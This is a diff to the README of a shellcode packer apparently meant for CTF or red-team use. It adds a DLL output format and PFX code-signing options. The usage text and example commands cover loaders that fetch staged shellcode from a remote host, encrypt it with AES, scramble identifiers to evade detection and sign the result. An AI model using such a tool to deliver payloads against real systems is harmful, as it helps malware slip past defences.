@@ -171,12 +171,14 @@ options:
 Staged:
 
 ```
-usage: main.py staged [-h] -p PAYLOAD -i IP_ADDRESS -po PORT -pa PATH [-o OUTPUT] [-e] [-s] [-si]
+usage: main.py staged [-h] -p PAYLOAD [-f {EXE,DLL}] -i IP_ADDRESS -po PORT -pa PATH [-o OUTPUT] [-e] [-s] [-pfx PFX] [-pfx-pass PFX_PASSWORD]
 
 options:
   -h, --help            show this help message and exit
   -p PAYLOAD, --payload PAYLOAD
                         Shellcode to be packed
+  -f {EXE,DLL}, --format {EXE,DLL}
+                        Format of the output file (default: EXE).
   -i IP_ADDRESS, --ip-address IP_ADDRESS
                         IP address from where your shellcode is gonna be fetched.
   -po PORT, --port PORT
@@ -187,25 +189,41 @@ options:
                         Output path where the shellcode is gonna be saved.
   -e, --encrypt         Encrypt the shellcode via AES-128-CBC.
   -s, --scramble        Scramble the loader's functions and variables.
-  -si, --sign           Sign the loader with a random certificate.
+  -pfx PFX, --pfx PFX   Path to the PFX file for signing the loader.
+  -pfx-pass PFX_PASSWORD, --pfx-password PFX_PASSWORD
+                        Password for the PFX file.
 
-Example usage: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o shellcode -e -s -si
+Example usage: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o shellcode -e -s -pfx cert.pfx -pfx-pass 'password'
 ```
 
 Stageless:
 
 ```
-usage: main.py stageless [-h] -p PAYLOAD [-o OUTPUT] [-e] [-s] [-si]
+usage: main.py stageless [-h] -p PAYLOAD [-f {EXE,DLL}] [-e] [-s] [-pfx PFX] [-pfx-pass PFX_PASSWORD]
 
 options:
   -h, --help            show this help message and exit
   -p PAYLOAD, --payload PAYLOAD
                         Shellcode to be packed
+  -f {EXE,DLL}, --format {EXE,DLL}
+                        Format of the output file (default: EXE).
   -e, --encrypt         Encrypt the shellcode via AES-128-CBC.
   -s, --scramble        Scramble the loader's functions and variables.
-  -si, --sign           Sign the loader with a random certificate.
+  -pfx PFX, --pfx PFX   Path to the PFX file for signing the loader.
+  -pfx-pass PFX_PASSWORD, --pfx-password PFX_PASSWORD
+                        Password for the PFX file.
 
-Example usage: python main.py stageless -p shellcode.bin -e -s -si
+Example usage: python main.py stageless -p shellcode.bin -o shellcode -e -s -pfx cert.pfx -pfx-pass 'password'
+```
+
+### Format option
+
+In both cases, staged or stageless, you can choose whether to compile your loader as an EXE or a DLL. To compile it as a DLL, simply append `-f DLL`. By default, it compiles as an EXE, though you can also explicitly specify this using -f EXE (but you don't need to).
+
+The DLL version exports a function called `ctf`. This is the function you need to call to start the exection. 
+
+```powershell
+rundll32.exe ctfloader.dll,ctf
 ```
 
 ### Staged
@@ -215,7 +233,7 @@ When using the staged "mode", the packer will generate you a .bin file named acc
 Example:
 
 ```powershell
-python main.py staged -p "C:\Code\CTFPacker\calc.bin" -i 192.168.2.121 -po 8080 -pa /shellcode.bin -o shellcode -s -si
+python main.py staged -p "C:\Code\CTFPacker\calc.bin" -i 192.168.2.121 -po 8080 -pa /shellcode.bin -o shellcode -s -pfx cert.pfx -pfx-pass Password
 
 
 
